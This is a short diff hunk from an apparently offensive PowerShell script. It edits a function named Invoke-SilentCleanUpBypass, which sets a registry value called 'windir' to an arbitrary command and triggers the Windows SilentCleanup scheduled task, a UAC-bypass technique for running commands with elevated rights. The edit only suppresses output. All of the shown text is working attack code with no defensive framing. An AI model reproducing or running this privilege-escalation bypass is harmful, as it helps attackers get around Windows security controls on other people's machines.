@@ -14,7 +14,7 @@ function Invoke-SilentCleanUpBypass {
 	$NAME = "windir"
 	$COMMAND = $Command + ";"
 	
-	New-ItemProperty -Path $REG -Name $NAME -Value $COMMAND -PropertyType string -Force
+	New-ItemProperty -Path $REG -Name $NAME -Value $COMMAND -PropertyType string -Force | out-null
 	Start-Sleep -s 1
 	schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 	Start-Sleep -s 1
